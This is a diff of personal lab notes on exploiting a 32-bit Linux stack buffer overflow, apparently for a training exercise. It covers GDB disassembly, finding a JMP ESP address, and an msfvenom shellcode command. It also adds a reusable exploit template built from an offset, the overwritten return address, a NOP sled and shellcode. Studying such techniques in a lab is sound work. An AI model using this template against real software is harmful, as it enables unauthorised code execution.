@@ -371,6 +371,7 @@ Dissasemmbly
 - disass main or pdisass main (run pdisass again on the result) --> !!DO THIS IN GDB
 - pdisass getuserinput
 - "what is the vulnerable function in the func file?" ---> you will get this answer after running pdisass cmds, answer will be the vulnerable one highlighted in red. (answer will be just the name, not including the @plt).
+- you find out getuser is vulnerable
 
 Dynamic Analysis Part II
         FUZZING
@@ -398,15 +399,16 @@ find JMP ESP
     0xf7f645fb
     0xf7f6460f
     0xf7f64aeb
-- break it up and convert to little endian to make it easier 0xf7de3b59 --> f7 de 3b 59 > "\x59\x3b\xde\f7"
+- break it up and convert to little endian to make it easier 0xf7de3b59 --> f7 de 3b 59 > "\x59\x3b\xde\xf7"
 - go back to your script --> new eip, make it equal to the little endian above --> make nop in the script, nop = "\x90" * 15 --> declare them in the print statement
 
+msfvenom -p linux/x86/exec CMD=whoami -b "\x00\fe\x20\x0a\xff" -f python (run in gdb shell, will look like $) ---> this will give you all the "buf +=" as shown below
 
 
-msfvenom -p linux/x86/exec CMD=whoami -b "\x00\fe\x20\x0a\xff" -f python (run in gdb shell, will look like $)
 
+what the script should look like !!!! ----> when doing this on a different program, essentailly you just change the "buf" section.
+############################################################
 offset = "A" * 62
-#eip = "BBBB"
 
 eip = "\x59\x3b\xde\xf7"
 nop = "\x90" * 15
@@ -421,3 +423,4 @@ buf += b"\x88\x2d\x7b\xb2\x01\x24\x9a\xf1\x26"
 
 
 print(offset + eip + nop + buf)
+###########################################################
